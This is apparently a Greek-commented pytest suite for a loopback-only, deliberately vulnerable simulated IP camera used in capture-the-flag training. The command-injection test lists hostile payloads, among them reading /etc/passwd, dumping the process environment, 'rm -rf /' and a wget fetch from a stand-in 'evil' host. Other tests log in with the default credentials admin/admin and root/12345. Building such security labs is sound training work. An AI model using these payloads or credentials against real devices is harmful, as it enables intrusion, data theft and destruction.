"""📷 NetCam Lab: ευάλωτη εικονική κάμερα — μόνο 127.0.0.1, καμία πραγματική εκτέλεση εντολών."""
import base64
import json
import os
import socket
import subprocess
import sys
import time
from urllib.parse import quote

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vulnlab  # noqa: E402

EPH = {"telnet_port": 0, "http_port": 0, "mqtt_port": 0}


class Clock:
    def __init__(self):
        self.t = 1_000_000.0

    def __call__(self):
        return self.t


class FakeState:
    def __init__(self):
        self.lab_ips = set()
        self.alerts = []

    def alert(self, typ, sev, actor, target, detail, t, key=None, cooldown=None, mitre=None, **kw):
        self.alerts.append({"type": typ, "sev": sev, "actor": actor, "lab": actor in self.lab_ips, "mitre": mitre})


@pytest.fixture
def lab():
    lb = vulnlab.VulnLab(FakeState(), EPH)
    lb.start()
    yield lb
    lb.stop()


def recv_until(s, token, limit=65536):
    toks = token if isinstance(token, tuple) else (token,)
    data = b""
    while not any(t in data for t in toks) and len(data) < limit:
        d = s.recv(4096)
        if not d:
            break
        data += d
    return data


def http(lab, path, method="GET", body=b"", auth=None, headers=""):
    with socket.create_connection(("127.0.0.1", lab.ports["http"]), timeout=5) as s:
        h = f"{method} {path} HTTP/1.0\r\nHost: x\r\n{headers}"
        if auth:
            h += "Authorization: Basic " + base64.b64encode(auth.encode()).decode() + "\r\n"
        if body:
            h += f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n"
        s.sendall((h + "\r\n").encode() + body)
        data = recv_until(s, b"\x00never", 1 << 20)
    head, _, payload = data.partition(b"\r\n\r\n")
    return int(head.split()[1]), head.decode("latin-1"), payload


def telnet_login(lab, user, pw):
    s = socket.create_connection(("127.0.0.1", lab.ports["telnet"]), timeout=5)
    banner = recv_until(s, b"login: ")
    s.sendall(user.encode() + b"\r\n")
    recv_until(s, b"Password: ")
    s.sendall(pw.encode() + b"\r\n")
    out = recv_until(s, (b"# ", b"incorrect"))
    return s, banner, out


def mqtt_connect(lab, user=None, pw=None):
    cid = b"t1"
    flags = (0x80 if user else 0) | (0x40 if pw else 0) | 0x02
    body = b"\x00\x04MQTT\x04" + bytes([flags]) + b"\x00\x1e" + len(cid).to_bytes(2, "big") + cid
    for x in (user, pw):
        if x:
            body += len(x).to_bytes(2, "big") + x.encode()
    s = socket.create_connection(("127.0.0.1", lab.ports["mqtt"]), timeout=5)
    s.sendall(b"\x10" + vulnlab._mqtt_len(len(body)) + body)
    ack = recv_until(s, b"\x20\x02", 4)
    while len(ack) < 4:
        ack += s.recv(4 - len(ack))
    return s, ack


# ---------------------------------------------------------------- δέσμευση / έναρξη / σταμάτημα
def test_binds_only_loopback_and_starts_only_on_request():
    lb = vulnlab.VulnLab(None, EPH)
    assert not lb.running and lb.listeners == {}
    lb.start()
    try:
        for svc, s in lb.listeners.items():
            assert s.getsockname()[0] == "127.0.0.1", svc
        assert set(lb.ports) == {"telnet", "http", "mqtt"}
        st = lb.status()
        assert st["running"] and st["host"] == "127.0.0.1" and st["listening"] == lb.ports
        port = lb.ports["http"]
    finally:
        lb.stop()
    assert not lb.running and lb.status()["listening"] == {}
    with pytest.raises(OSError):
        socket.create_connection(("127.0.0.1", port), timeout=1).close()


def test_host_not_configurable_and_low_ports_rejected():
    assert vulnlab.HOST == "127.0.0.1"
    with pytest.raises(ValueError):
        vulnlab.VulnLab(None, {"telnet_port": 23})
    lb = vulnlab.VulnLab(None, {**EPH, "bind": "0.0.0.0", "host": "0.0.0.0"})
    lb.start()
    try:
        assert all(s.getsockname()[0] == "127.0.0.1" for s in lb.listeners.values())
    finally:
        lb.stop()


def test_start_is_idempotent_and_port_conflict_is_clean_error():
    busy = socket.socket()
    busy.bind(("127.0.0.1", 0))
    busy.listen(1)
    try:
        lb = vulnlab.VulnLab(None, {**EPH, "http_port": busy.getsockname()[1]})
        with pytest.raises(ValueError, match="θύρα"):
            lb.start()
        assert not lb.running and lb.listeners == {}
    finally:
        busy.close()
    lb = vulnlab.VulnLab(None, EPH)
    p1 = lb.start()["listening"]
    assert lb.start()["listening"] == p1
    lb.stop()


# ---------------------------------------------------------------- 1. αναγνώριση
def test_recon_banners_leak_flag_until_fixed(lab):
    s, banner, _ = telnet_login(lab, "x", "y")
    s.close()
    assert lab.flag("recon").encode() in banner and b"BusyBox" in banner
    code, head, _ = http(lab, "/")
    assert "GoAhead-Webs/2.5.0" in head and lab.flag("recon") in head
    lab.set_fix("recon", True)
    code, head, _ = http(lab, "/")
    assert "GoAhead" not in head and lab.flag("recon") not in head


# ---------------------------------------------------------------- 2. telnet
def test_telnet_default_creds_success_and_fake_shell(lab):
    s, _, out = telnet_login(lab, "admin", "admin")
    assert b"# " in out
    for cmd, expect in ((b"cat /root/flag.txt", lab.flag("telnet").encode()), (b"id", b"uid=0(root)"),
                        (b"uname -a", b"mips"), (b"ps", b"telnetd"), (b"ls /", b"etc"),
                        (b"/bin/busybox MIRAI", b"applet not found"), (b"nosuch", b"not found")):
        s.sendall(cmd + b"\r\n")
        assert expect in recv_until(s, b"\n# "), cmd
    s.sendall(b"exit\r\n")
    s.close()
    assert any(e["kind"] == "login_ok" for e in lab.events)


def test_telnet_root_12345_and_wrong_password(lab):
    s, _, out = telnet_login(lab, "root", "12345")
    assert b"# " in out
    s.close()
    s, _, out = telnet_login(lab, "admin", "wrong")
    s.close()
    assert b"Login incorrect" in out and b"#" not in out.replace(b"Login incorrect", b"")
    assert any(e["kind"] == "login_fail" for e in lab.events)


def test_telnet_bruteforce_raises_lab_alert(lab):
    s = socket.create_connection(("127.0.0.1", lab.ports["telnet"]), timeout=5)
    recv_until(s, b"login: ")
    for i in range(3):
        s.sendall(b"admin\r\nbad%d\r\n" % i)
        recv_until(s, b"incorrect")
    s.close()
    s, _, _ = telnet_login(lab, "root", "x")
    s.close()
    s, _, _ = telnet_login(lab, "root", "y")
    s.close()
    time.sleep(0.4)
    al = [a for a in lab.st.alerts if a["type"].startswith("Brute force")]
    assert al and al[0]["actor"] == "127.0.0.1" and al[0]["lab"] is True


def test_telnet_fix_closes_port(lab):
    port = lab.ports["telnet"]
    lab.set_fix("telnet", True)
    assert "telnet" not in lab.ports
    with pytest.raises(OSError):
        socket.create_connection(("127.0.0.1", port), timeout=1).close()
    lab.set_fix("telnet", False)
    s, _, out = telnet_login(lab, "admin", "admin")
    s.close()
    assert b"# " in out


# ---------------------------------------------------------------- 3. web
def test_web_default_creds_basic_and_form(lab):
    assert http(lab, "/admin")[0] == 401
    code, _, body = http(lab, "/admin", auth="admin:admin")
    assert code == 200 and lab.flag("webcreds").encode() in body
    code, head, _ = http(lab, "/login", "POST", b"user=admin&pass=admin")
    assert code == 302 and "SID=" in head
    sid = head.split("SID=")[1].split(";")[0]
    code, _, body = http(lab, "/admin", headers=f"Cookie: SID={sid}\r\n")
    assert code == 200 and lab.flag("webcreds").encode() in body
    assert http(lab, "/login", "POST", b"user=admin&pass=nope")[0] == 401
    lab.set_fix("webcreds", True)
    assert http(lab, "/admin", auth="admin:admin")[0] == 401
    assert http(lab, "/admin", headers=f"Cookie: SID={sid}\r\n")[0] == 401  # παλιές συνεδρίες ακυρώνονται
    assert http(lab, "/admin", auth="admin:" + lab.strong_pw("web"))[0] == 200


# ---------------------------------------------------------------- 4. backup
def test_backup_leak_and_fix(lab):
    assert b"/backup/" in http(lab, "/robots.txt")[2]
    code, _, body = http(lab, "/backup/config.bin")
    assert code == 200 and lab.flag("backup").encode() in body
    assert vulnlab.WIFI_PSK.encode() in body and b"admin_pass=admin" in body
    assert any(a["type"].startswith("Έκθεση αρχείου") for a in lab.st.alerts)
    lab.set_fix("backup", True)
    code, _, body = http(lab, "/cgi-bin/backup")
    assert code == 401 and lab.flag("backup").encode() not in body
    assert http(lab, "/backup/config.bin", auth="admin:admin")[0] == 200  # με σύνδεση (άμυνα σε βάθος: + fix 3)


# ---------------------------------------------------------------- 5. command injection (ΠΡΟΣΟΜΟΙΩΣΗ)
def test_injection_is_simulated_never_executes(lab, monkeypatch):
    def boom(*a, **k):
        raise AssertionError("ΚΛΗΘΗΚΕ ΠΡΑΓΜΑΤΙΚΗ ΕΚΤΕΛΕΣΗ")
    for name in ("Popen", "run", "call", "check_output", "check_call"):
        monkeypatch.setattr(subprocess, name, boom)
    for name in ("system", "popen", "execv", "execve", "execvp", "spawnv", "fork"):
        if hasattr(os, name):
            monkeypatch.setattr(os, name, boom)
    import builtins
    monkeypatch.setattr(builtins, "eval", boom)
    monkeypatch.setattr(builtins, "exec", boom)
    for payload in ("127.0.0.1; env", "127.0.0.1 && cat /etc/passwd", "x|id", "`id`", "$(cat /proc/self/environ)",
                    "1.1.1.1; rm -rf /", "1.1.1.1; wget http://evil/x.sh"):
        code, _, body = http(lab, "/cgi-bin/ping.cgi?ip=" + quote(payload))
        assert code == 200
    code, _, body = http(lab, "/cgi-bin/ping.cgi?ip=" + quote("8.8.8.8; cat /etc/passwd"))
    assert b"root:x:0:0" in body and b"PING 8.8.8.8" in body
    code, _, body = http(lab, "/cgi-bin/ping.cgi", "POST", b"ip=" + quote("127.0.0.1; env").encode())
    assert lab.flag("cmdi").encode() in body
    assert any(e["kind"] == "injection" for e in lab.events)
    assert any(a["type"].startswith("Command injection") for a in lab.st.alerts)
    src = open(vulnlab.__file__, encoding="utf-8").read()
    assert "subprocess" not in vulnlab.__dict__ and "import subprocess" not in src and "os.system" not in src


def test_injection_fix_validates_input(lab):
    lab.set_fix("cmdi", True)
    code, _, body = http(lab, "/cgi-bin/ping.cgi?ip=" + quote("127.0.0.1; env"))
    assert code == 400 and lab.flag("cmdi").encode() not in body
    code, _, body = http(lab, "/cgi-bin/ping.cgi?ip=8.8.8.8")
    assert code == 200 and b"PING 8.8.8.8" in body


def test_telnet_shell_cannot_see_cgi_flag():
    lb = vulnlab.VulnLab(None, EPH)
    out, _ = vulnlab.FakeShell(lb, "telnet").run("env")
    assert lb.flag("cmdi") not in out
    out, _ = vulnlab.FakeShell(lb, "cgi").run("cat /root/flag.txt")
    assert lb.flag("telnet") not in out


# ---------------------------------------------------------------- 6. MQTT
def test_mqtt_anonymous_leaks_stream_token_and_fix(lab):
    s, ack = mqtt_connect(lab)
    assert ack == b"\x20\x02\x00\x00"
    s.sendall(b"\x82" + vulnlab._mqtt_len(2 + 2 + 1 + 1) + b"\x00\x01" + b"\x00\x01#" + b"\x00")
    data = recv_until(s, lab.flag("mqtt").encode())
    s.close()
    assert data.startswith(b"\x90") and lab.flag("mqtt").encode() in data and b"netcam/nc200/stream" in data
    # κείμενο (για nc)
    with socket.create_connection(("127.0.0.1", lab.ports["mqtt"]), timeout=5) as t:
        t.sendall(b"SUB netcam/+/stream\n")
        assert lab.flag("mqtt").encode() in recv_until(t, b"END")
    lab.set_fix("mqtt", True)
    s, ack = mqtt_connect(lab)
    s.close()
    assert ack == b"\x20\x02\x00\x05"
    s, ack = mqtt_connect(lab, "nc200", lab.strong_pw("mqtt"))
    s.close()
    assert ack == b"\x20\x02\x00\x00"
    with socket.create_connection(("127.0.0.1", lab.ports["mqtt"]), timeout=5) as t:
        t.sendall(b"SUB #\n")
        assert b"not authorized" in recv_until(t, b"\n")


def test_topic_match():
    assert vulnlab.topic_match("#", "a/b")
    assert vulnlab.topic_match("a/+/c", "a/b/c")
    assert not vulnlab.topic_match("a/+", "a/b/c")
    assert vulnlab.topic_match("a/#", "a/b/c")


# ---------------------------------------------------------------- 7. firmware
def test_firmware_strings_reveal_key_until_fixed(lab):
    code, _, fw = http(lab, "/firmware/nc200.bin")
    assert code == 200 and len(fw) > 10000
    assert (b"\x00cloud_api_secret=" + lab.flag("firmware").encode() + b"\x00") in fw and b"AES_KEY=" in fw
    assert fw == lab.firmware_blob()  # ντετερμινιστικό
    lab.set_fix("firmware", True)
    _, _, fw2 = http(lab, "/firmware/nc200.bin")
    assert lab.flag("firmware").encode() not in fw2 and b"AES_KEY" not in fw2 and b"v1.0.4" in fw2


# ---------------------------------------------------------------- σημαίες / πρόοδος / verify
def test_flag_submission_and_score(tmp_path):
    p = str(tmp_path / "vulnlab.json")
    lb = vulnlab.VulnLab(None, EPH, path=p)
    r = lb.submit("NW{nope}")
    assert r["correct"] is False and r["score"] == 0
    r = lb.submit("  " + lb.flag("backup") + " ")
    assert r["correct"] and r["id"] == "backup" and r["points"] == 150 and not r["already"] and r["score"] == 150
    assert lb.submit(lb.flag("backup"))["already"] is True
    with pytest.raises(ValueError):
        lb.submit("")
    lb.set_fix("mqtt", True)
    d = json.load(open(p))
    assert "backup" in d["solved"] and d["fixed"]["mqtt"] is True
    lb2 = vulnlab.VulnLab(None, EPH, path=p)  # η πρόοδος και οι σημαίες επιβιώνουν
    assert lb2.flag("backup") == lb.flag("backup") and lb2.score() == 150 and lb2.fixed["mqtt"]
    st = lb2.status()
    assert st["total"] == vulnlab.TOTAL and [c["id"] for c in st["challenges"]] == vulnlab.IDS
    assert all(lb.flag(c) not in json.dumps(st) for c in vulnlab.IDS)  # το status δεν προδίδει σημαίες
    lb2.reset()
    assert lb2.score() == 0 and not any(lb2.fixed.values())


def test_flags_differ_per_install():
    assert vulnlab.VulnLab(None, EPH).flag("recon") != vulnlab.VulnLab(None, EPH).flag("recon")


def test_verify_before_and_after_fixes(lab):
    r = lab.verify()
    assert r["secure"] == 0 and all(not x["secure"] for x in r["results"])
    for cid in vulnlab.IDS:
        lab.set_fix(cid, True)
    r = lab.verify()
    assert r["secure"] == len(vulnlab.IDS), r["results"]
    assert not any(a for a in lab.st.alerts if a["type"].startswith("Brute"))
    st = lab.status()
    assert all(c["verify"]["secure"] for c in st["challenges"])
    assert any(e.get("verify") for e in st["events"])


def test_verify_requires_running():
    with pytest.raises(ValueError):
        vulnlab.VulnLab(None, EPH).verify()


# ---------------------------------------------------------------- αδράνεια / πόροι
def test_idle_auto_stop_with_injected_clock():
    clk = Clock()
    st = FakeState()
    lb = vulnlab.VulnLab(st, {**EPH, "idle_minutes": 30}, clock=clk)
    lb.start()
    assert "127.0.0.1" in st.lab_ips
    try:
        clk.t += 29 * 60
        assert not lb.tick() and lb.running and lb.idle_left() == 60
        lb.submit(lb.flag("recon"))  # δραστηριότητα → μηδενίζει τον μετρητή
        clk.t += 29 * 60
        assert not lb.tick()
        clk.t += 2 * 60
        assert lb.tick() and not lb.running
        assert lb.status()["stopped_reason"] == "idle"
        assert "127.0.0.1" not in st.lab_ips
    finally:
        lb.stop()


def test_connection_limit():
    lb = vulnlab.VulnLab(None, {**EPH, "max_conns": 2})
    lb.start()
    socks = []
    try:
        for _ in range(2):
            s = socket.create_connection(("127.0.0.1", lb.ports["telnet"]), timeout=5)
            recv_until(s, b"login: ")
            socks.append(s)
        s3 = socket.create_connection(("127.0.0.1", lb.ports["telnet"]), timeout=5)
        assert s3.recv(100) == b""  # κλείνει αμέσως
        s3.close()
        assert any(e["kind"] == "limit" for e in lb.events)
    finally:
        for s in socks:
            s.close()
        lb.stop()


def test_oversized_inputs_are_bounded(lab):
    with socket.create_connection(("127.0.0.1", lab.ports["http"]), timeout=5) as s:
        s.sendall(b"GET /" + b"A" * 20000 + b" HTTP/1.0\r\n")
        assert b" 431 " in recv_until(s, b"\r\n")
    with socket.create_connection(("127.0.0.1", lab.ports["http"]), timeout=5) as s:
        s.sendall(b"POST /login HTTP/1.0\r\nContent-Length: 999999\r\n\r\n")
        assert b" 413 " in recv_until(s, b"\r\n")
    with socket.create_connection(("127.0.0.1", lab.ports["telnet"]), timeout=5) as s:
        recv_until(s, b"login: ")
        try:
            s.sendall(b"A" * 5000)
            assert recv_until(s, b"\x00never") == b""  # η γραμμή ξεπέρασε το όριο → κλείσιμο
        except (ConnectionResetError, BrokenPipeError):
            pass
    s, ack = mqtt_connect(lab)
    with s:
        s.sendall(b"\x30\xff\xff\x03")  # PUBLISH ~64 KB > όριο
        assert recv_until(s, b"\x00never") == b""
    assert lab.running


def test_stop_closes_open_sessions():
    lb = vulnlab.VulnLab(None, EPH)
    lb.start()
    s, _, out = telnet_login(lb, "admin", "admin")
    assert b"# " in out
    lb.stop()
    s.settimeout(3)
    try:
        assert s.recv(100) == b""
    except (ConnectionResetError, OSError):
        pass
    s.close()
    assert lb.conns == set()
